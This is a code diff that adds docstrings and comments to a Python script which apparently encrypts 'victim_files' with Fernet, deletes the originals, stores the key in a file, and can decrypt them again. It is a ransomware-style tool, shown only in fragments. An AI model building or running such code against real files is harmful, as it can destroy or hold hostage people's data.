@@ -19,6 +19,10 @@ def get_files():
 
 
 def encrypt_files(key):
+    """
+    Encrypt files into a new file with a given extension with the specified key.
+    Removes the file after encrypting.
+    """
     fernet = Fernet(key=key)
     for file in victim_files:
         if file.split('.')[-1] != lock_extension:
@@ -34,6 +38,10 @@ def encrypt_files(key):
 
 
 def decrypt_files(key):
+    """
+    Decrypts the files ending with specified extension with the given key.
+    Removes the encrypted files after decrypting.
+    """
     fernet = Fernet(key=key)
     for file in victim_files:
         if file.split('.')[-1] == lock_extension:
@@ -50,6 +58,9 @@ def decrypt_files(key):
 
 
 def write_key(key):
+    """
+    Write the key to the specified key file. If the key file exists, returns False.
+    """
     if os.path.exists(key_file_name):
         return False
     try:
@@ -61,6 +72,9 @@ def write_key(key):
 
 
 def read_key():
+    """
+    Reads the key from the specified key file.
+    """
     try:
         with open(key_file_name, 'rb') as f:
             return f.read()
@@ -75,11 +89,11 @@ if __name__ == '__main__':
     get_files()
     if sys.argv[1] == 'encrypt':
         key = Fernet.generate_key()
-        if write_key(key):
-            encrypt_files(key)
-            sys.exit(0)
+        if write_key(key):                              # If key file already exists, skips this operation.
+            encrypt_files(key)                          # This prevents double encryption and loss of original
+            sys.exit(0)                                 # key file.
     elif sys.argv[1] == 'decrypt':
-        key = read_key()
+        key = read_key()                                # If key file exists, proceeds with operation, else ignore.
         if key:
             decrypt_files(key)
             sys.exit(0)
